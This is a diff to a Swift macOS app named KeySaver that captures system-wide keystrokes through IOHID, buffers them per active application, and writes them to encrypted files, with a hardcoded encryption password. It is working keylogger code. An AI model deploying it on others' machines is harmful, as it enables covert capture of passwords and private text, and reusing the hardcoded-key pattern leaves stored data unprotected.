@@ -12,15 +12,31 @@ import Cocoa
 
 class LoggerCallback
 {
-    static var PASSWORD = "this-is-the-PASSWORD-for-KeySaver1"
+    static let appIconFileName = "appIcon.png"
+    static let PASSWORD = "this-is-the-PASSWORD-for-KeySaver1"
     static var CAPSLOCK = false
     static var SHIFT = false
     //    static var prev = ""
     static var command = false
     
-    static var text = ""
+//    static var text = ""
     
-    static func encrypt(text: String, toFile file: URL) {
+    static func encrypt(text: String, toFile file: URL, appIcon: NSImage? = Keylogger.activeApp.icon) {
+        let appFolder = Keylogger.activeApp.name
+        let path = Keylogger.dataDir.appendingPathComponent(appFolder)
+        if !FileManager.default.fileExists(atPath: path.path)
+        {
+            do {
+                try FileManager.default.createDirectory(at: path, withIntermediateDirectories: false, attributes: nil)
+                if let appIcon = appIcon {
+                    if !appIcon.pngWrite(to: path.appendingPathComponent(appIconFileName)) {
+                        print("could not save appicon for " + appFolder)
+                    }
+                }
+            } catch {
+                print("Can't create app directory!")
+            }
+        }
         if var fileContents = NSData.init(contentsOf: file) as Data? {
             print("file exists")
             if (!fileContents.isEmpty) {
@@ -53,7 +69,7 @@ class LoggerCallback
         let this = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let element: IOHIDElement = IOHIDValueGetElement(device);
         //        var test: Bool
-        if IOHIDElementGetUsagePage(element) != 0x07 || this.appName == "KeySaver" {
+        if IOHIDElementGetUsagePage(element) != 0x07 || Keylogger.activeApp.name == "KeySaver" {
             return
         }
         let code = IOHIDElementGetUsage(element);
@@ -61,32 +77,6 @@ class LoggerCallback
             return
         }
         let pressed = IOHIDValueGetIntegerValue(device);
-        //        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
-        //        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
-        //        if !FileManager.default.fileExists(atPath: path.path)
-        //        {
-        //            do
-        //            {
-        //                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
-        //            }
-        //            catch
-        //            {
-        //                print("Can't Create Folder")
-        //            }
-        //        }
-        //            test = false
-        //        }
-        //        else
-        //        {
-        //            test = true
-        //            CallbackFunctions.prev = fileName
-        //        }
-
-        //        if test
-        //        {
-        //            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
-        //            fh?.write(timeStamp.data(using: .utf8)!)
-        //        }
         
         Outside:if pressed == 1 { // keydown
             if code == 57 { // Capslock
@@ -102,18 +92,16 @@ class LoggerCallback
             }
             if code >= 224 && code <= 231 || command {
                 command = true
-                //                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
-                //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 break Outside
             }
             if LoggerCallback.CAPSLOCK || LoggerCallback.SHIFT { // Show uppercase
-                text += this.keyMap[code]![1]
+                Keylogger.activeApp.data += this.keyMap[code]![1]
             } else { // Show lowercase
-                text += this.keyMap[code]![0]
+                Keylogger.activeApp.data += this.keyMap[code]![0]
             }
-            if (text.count == 10) {
-                LoggerCallback.encrypt(text: text, toFile: Keylogger.getDateFile())
-                text = ""
+            if (Keylogger.activeApp.data.count == 10) {
+                LoggerCallback.encrypt(text: Keylogger.activeApp.data, toFile: Keylogger.getDateFile(forApp: Keylogger.activeApp.name))
+                Keylogger.activeApp.data = ""
             }
         } else { // keyup
             if code == 225 || code == 229 { // no more shift
@@ -123,6 +111,22 @@ class LoggerCallback
             if code >= 224 && code <= 231 { // no more special keys
                 command = false
             }
+        }
+    }
+}
+
+extension NSImage {
+    var pngData: Data? {
+        guard let tiffRepresentation = tiffRepresentation, let bitmapImage = NSBitmapImageRep(data: tiffRepresentation) else { return nil }
+        return bitmapImage.representation(using: .png, properties: [:])
+    }
+    func pngWrite(to url: URL, options: Data.WritingOptions = .atomic) -> Bool {
+        do {
+            try pngData?.write(to: url, options: options)
+            return true
+        } catch {
+            print(error)
+            return false
         }
     }
 }
